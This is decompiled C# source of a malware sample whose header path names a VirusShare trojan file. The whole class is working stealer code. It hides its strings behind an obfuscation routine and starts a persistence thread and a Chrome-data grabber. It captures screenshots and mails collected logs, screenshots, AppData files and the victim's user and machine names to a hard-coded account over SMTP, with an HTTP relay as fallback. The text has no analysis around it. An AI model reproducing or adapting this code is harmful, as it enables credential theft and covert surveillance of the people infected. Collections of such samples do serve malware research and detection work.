// Decompiled with JetBrains decompiler
// Type: CMFVPTX
// Assembly: new2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7D97D205-93EA-4722-A1E5-21E77DE843A1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-30a4eb8393f203db2dc365b910e352cfc02ba6f80a0ccd316800296661747606.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;

public class CMFVPTX
{
  public static string YBXCIO;
  public static string UBCOIK;
  public static string NSLICK;
  public static string OTOQUL;
  public static string USRSFT;
  public static string CGXUGF;
  public static string GXHHSQ;
  public static string TTIUSW;
  public static string GJOJFO;
  public static string QECQVQ;
  public static string MORBQW;
  public static string LFMYTK;
  public static string JDLTJK;
  public static string GXDYQP = "";
  public static string MBLHT = WOGVCL.TGKKNH("iqKktKmErKSFnoWUp7Fle6KrMQ==", "False");
  public static string FRNFY = WOGVCL.TGKKNH("c1Wlq3JgYqmWMQ==", "False");
  public static string WUFDB = WOGVCL.TGKKNH("jKGztmaAoaCvpEeXrrMx", "False");
  public static int EKFYV = 587;
  public static string OSEHB = WOGVCL.TGKKNH("DLEXSite", "False");
  public static string UTTIL = WOGVCL.TGKKNH("iK+6vXlPaig=", "False");
  public static string OUOFF = WOGVCL.TGKKNH("KA==", "False");
  public static string JOJNL = WOGVCL.TGKKNH("ZKy3u7BZWnXEbk9qfoRvTyg=", "False");
  public static string OCOFY = WOGVCL.TGKKNH("eKW1sq+Yr2ehpZOysLGllFyqvbWNoGe8r5Vcs72hhVyUoYNUbnWSjG1qZyg=", "False");
  public static string XYVKU = WOGVCL.TGKKNH("lc7c0wk=", "False");
  public static string YHFRB = WOGVCL.TGKKNH("g7nP3cEJ", "False");
  public static int JRDDH = 3000000;
  public static string KOIIU = "";
  public static string IKKVKS = "";
  public static int number = 0;
  public static FLOUNLNG URSYJMKR;
  public static Thread NGPJWMFR = new Thread(new ThreadStart(CMFVPTX.WSDQSBLK));
  public static Thread GCThread = new Thread(new ThreadStart(DAChrome.GTCHRME));
  public static Thread SPTEUFXC = new Thread(new ThreadStart(CMFVPTX.HYURLSHJ));
  public static Thread STRTTHRD = new Thread(new ThreadStart(DAStartup.Startupdll.StartPers));

  [STAThread]
  public static void Main()
  {
    int num1;
    try
    {
      Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5);
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      try
      {
        foreach (string file in MyProject.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), Microsoft.VisualBasic.FileIO.SearchOption.SearchAllSubDirectories, "*.png*"))
          System.IO.File.Delete(file);
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
      try
      {
        foreach (string file in MyProject.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
          System.IO.File.Delete(file);
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      CMFVPTX.STRTTHRD.IsBackground = true;
      CMFVPTX.STRTTHRD.Start();
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    int num2 = 0;
    int num3;
    while (true)
    {
      num3 = 1;
      try
      {
        if (num2 == 3)
          Application.Restart();
        CMFVPTX.URSYJMKR = new FLOUNLNG(CMFVPTX.IKKVKS);
        FLOUNLNG.PMRWJIIE();
        break;
      }
      catch (Exception ex)
      {
        int lErl = num3;
        ProjectData.SetProjectError(ex, lErl);
        checked { ++num2; }
        ProjectData.ClearProjectError();
      }
    }
    try
    {
      CMFVPTX.NGPJWMFR.IsBackground = true;
      CMFVPTX.NGPJWMFR.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      string ouoff = CMFVPTX.OUOFF;
      if (Operators.CompareString(ouoff, WOGVCL.TGKKNH("ltLc2gI=", "False"), false) == 0)
      {
        int num4 = (int) MessageBox.Show(CMFVPTX.OCOFY, CMFVPTX.JOJNL, MessageBoxButtons.OK, MessageBoxIcon.None);
      }
      else if (Operators.CompareString(ouoff, WOGVCL.TGKKNH("h6zIy7ieshg=", "False"), false) == 0)
      {
        int num5 = (int) MessageBox.Show(CMFVPTX.OCOFY, CMFVPTX.JOJNL, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      }
      else if (Operators.CompareString(ouoff, WOGVCL.TGKKNH("c8G3x66bqsjEvJwZ", "False"), false) == 0)
      {
        int num6 = (int) MessageBox.Show(CMFVPTX.OCOFY, CMFVPTX.JOJNL, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      }
      else if (Operators.CompareString(ouoff, WOGVCL.TGKKNH("bqqwuC8=", "False"), false) == 0)
      {
        int num7 = (int) MessageBox.Show(CMFVPTX.OCOFY, CMFVPTX.JOJNL, MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (Operators.CompareString(ouoff, WOGVCL.TGKKNH("W6Ousqcw", "False"), false) == 0)
      {
        int num8 = (int) MessageBox.Show(CMFVPTX.OCOFY, CMFVPTX.JOJNL, MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (Operators.CompareString(ouoff, WOGVCL.TGKKNH("kdDL4NOpytQJ", "False"), false) == 0)
      {
        int num9 = (int) MessageBox.Show(CMFVPTX.OCOFY, CMFVPTX.JOJNL, MessageBoxButtons.OK, MessageBoxIcon.Question);
      }
      else if (Operators.CompareString(ouoff, WOGVCL.TGKKNH("cKS8uSI=", "False"), false) == 0)
      {
        int num10 = (int) MessageBox.Show(CMFVPTX.OCOFY, CMFVPTX.JOJNL, MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (Operators.CompareString(ouoff, WOGVCL.TGKKNH("h9Tg2Nev1NcD", "False"), false) == 0)
      {
        int num11 = (int) MessageBox.Show(CMFVPTX.OCOFY, CMFVPTX.JOJNL, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
      else if (Operators.CompareString(ouoff, WOGVCL.TGKKNH("b6+ywreTosC8tJQh", "False"), false) == 0)
      {
        int num12 = (int) MessageBox.Show(CMFVPTX.OCOFY, CMFVPTX.JOJNL, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
      else
      {
        int num13 = (int) MessageBox.Show(WOGVCL.TGKKNH("mc3V39K7zYq21bbO3JGyp8Lf48iojYrBz6nA3daDq86K5dJkx97l036Omd7Mp9HZ5NKq05jU0rF/0ODVZMzZ48hkx8/d03ID", "False"), WOGVCL.TGKKNH("i7/H0cStv3yox6jAzhM=", "False"), MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      CMFVPTX.GCThread.IsBackground = true;
      CMFVPTX.GCThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      CMFVPTX.SPTEUFXC.IsBackground = true;
      CMFVPTX.SPTEUFXC.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    Process.GetCurrentProcess().WaitForExit();
  }

  public static void QKXQNG(ref double SNOGMSTK)
  {
    try
    {
      DateTime t2 = DateAndTime.Now.AddSeconds(SNOGMSTK);
      while (DateTime.Compare(DateAndTime.Now, t2) < 0)
        Application.DoEvents();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void WSDQSBLK()
  {
    while (true)
    {
      Thread.Sleep(CMFVPTX.JRDDH);
      string str1 = "";
      double SNOGMSTK1 = 0.2;
      CMFVPTX.QKXQNG(ref SNOGMSTK1);
      string str2;
      try
      {
        WebClient webClient = new WebClient();
        str2 = WOGVCL.TGKKNH("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(WOGVCL.TGKKNH("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + WOGVCL.TGKKNH("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str2 = "";
        ProjectData.ClearProjectError();
      }
      double SNOGMSTK2 = 1.0;
      CMFVPTX.QKXQNG(ref SNOGMSTK2);
      try
      {
        if (Operators.CompareString(CMFVPTX.XYVKU, WOGVCL.TGKKNH("mNHf1gY=", "False"), false) == 0)
        {
          Rectangle bounds = Screen.PrimaryScreen.Bounds;
          Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
          bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + CMFVPTX.number.ToString() + WOGVCL.TGKKNH("ZsPMzBI=", "False"));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      double SNOGMSTK3 = 0.3;
      CMFVPTX.QKXQNG(ref SNOGMSTK3);
      try
      {
        if (Operators.CompareString(CMFVPTX.IKKVKS, "", false) != 0)
        {
          CMFVPTX.KOIIU = WOGVCL.TGKKNH("fHiEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYSLYG2rrsFgXnmEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYWrKQ==", "False") + Environment.NewLine + Environment.NewLine + CMFVPTX.IKKVKS + Environment.NewLine + Environment.NewLine + str2 + Environment.NewLine + Environment.NewLine + str1;
          try
          {
            MailMessage message = new MailMessage();
            MailMessage mailMessage = message;
            mailMessage.From = new MailAddress(CMFVPTX.MBLHT);
            mailMessage.To.Add(CMFVPTX.MBLHT);
            mailMessage.Subject = WOGVCL.TGKKNH("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + WOGVCL.TGKKNH("aQ0=", "False") + Environment.MachineName.ToString();
            mailMessage.Body = CMFVPTX.KOIIU;
            try
            {
              if (Operators.CompareString(CMFVPTX.XYVKU, WOGVCL.TGKKNH("mNHf1gY=", "False"), false) == 0)
              {
                Attachment attachment = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + CMFVPTX.number.ToString() + WOGVCL.TGKKNH("ZsPMzBI=", "False"));
                mailMessage.Attachments.Add(attachment);
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            new SmtpClient(CMFVPTX.WUFDB)
            {
              Port = CMFVPTX.EKFYV,
              EnableSsl = true,
              Credentials = ((ICredentialsByHost) new NetworkCredential(CMFVPTX.MBLHT, CMFVPTX.FRNFY))
            }.Send(message);
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            try
            {
              HttpWebResponse response = (HttpWebResponse) WebRequest.Create(WOGVCL.TGKKNH("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False") + "?to=" + CMFVPTX.MBLHT + "&subject=" + Strings.Replace(WOGVCL.TGKKNH("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + WOGVCL.TGKKNH("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20") + "&message=" + Strings.Replace(CMFVPTX.KOIIU, " ", "%20") + "&from=" + CMFVPTX.MBLHT).GetResponse();
            }
            catch (Exception ex2)
            {
              ProjectData.SetProjectError(ex2);
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      CMFVPTX.KOIIU = "";
      CMFVPTX.IKKVKS = "";
      CMFVPTX.GXDYQP = "";
      checked { ++CMFVPTX.number; }
    }
  }

  public static void HYURLSHJ()
  {
    int length = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("eoatrq+NrLOxsXp7pa6ok6m3pyw=", WOGVCL.TGKKNH("g7nP3cEJ", "False"))).Length;
    FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("eoatrq+NrLOxsXp7pa6ok6m3pyw=", WOGVCL.TGKKNH("g7nP3cEJ", "False"))).GetFiles();
    try
    {
      double SNOGMSTK = 25.0;
      CMFVPTX.QKXQNG(ref SNOGMSTK);
      string Expression = WOGVCL.TGKKNH("lZGdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3krPbvpvBxdnMd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ4sg4=", "False") + Environment.NewLine + Environment.NewLine + CMFVPTX.YBXCIO + Environment.NewLine + Environment.NewLine + CMFVPTX.UBCOIK + Environment.NewLine + Environment.NewLine + CMFVPTX.NSLICK + Environment.NewLine + Environment.NewLine + CMFVPTX.OTOQUL + Environment.NewLine + Environment.NewLine + CMFVPTX.USRSFT + Environment.NewLine + Environment.NewLine + CMFVPTX.CGXUGF + Environment.NewLine + Environment.NewLine + CMFVPTX.GXHHSQ + Environment.NewLine + Environment.NewLine + CMFVPTX.TTIUSW + Environment.NewLine + Environment.NewLine + CMFVPTX.QECQVQ + Environment.NewLine + Environment.NewLine + CMFVPTX.MORBQW + Environment.NewLine + Environment.NewLine + CMFVPTX.LFMYTK + Environment.NewLine + Environment.NewLine + CMFVPTX.JDLTJK + Environment.NewLine + Environment.NewLine + WOGVCL.TGKKNH("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo0f", "False");
      try
      {
        MailMessage message = new MailMessage();
        MailMessage mailMessage = message;
        mailMessage.From = new MailAddress(CMFVPTX.MBLHT);
        mailMessage.To.Add(CMFVPTX.MBLHT);
        mailMessage.Subject = WOGVCL.TGKKNH("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + WOGVCL.TGKKNH("aQ0=", WOGVCL.TGKKNH("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
        mailMessage.Body = Expression;
        try
        {
          FileInfo[] fileInfoArray = files;
          int index = 0;
          while (index < fileInfoArray.Length)
          {
            Attachment attachment = new Attachment(fileInfoArray[index].FullName);
            mailMessage.Attachments.Add(attachment);
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        new SmtpClient(CMFVPTX.WUFDB)
        {
          Port = CMFVPTX.EKFYV,
          EnableSsl = true,
          Credentials = ((ICredentialsByHost) new NetworkCredential(CMFVPTX.MBLHT, CMFVPTX.FRNFY))
        }.Send(message);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          HttpWebResponse response = (HttpWebResponse) WebRequest.Create(WOGVCL.TGKKNH("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False") + "?to=" + CMFVPTX.MBLHT + "&subject=" + Strings.Replace(WOGVCL.TGKKNH("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + WOGVCL.TGKKNH("aQ0=", WOGVCL.TGKKNH("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20") + "&message=" + Strings.Replace(Expression, " ", "%20") + "&from=" + CMFVPTX.MBLHT).GetResponse();
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
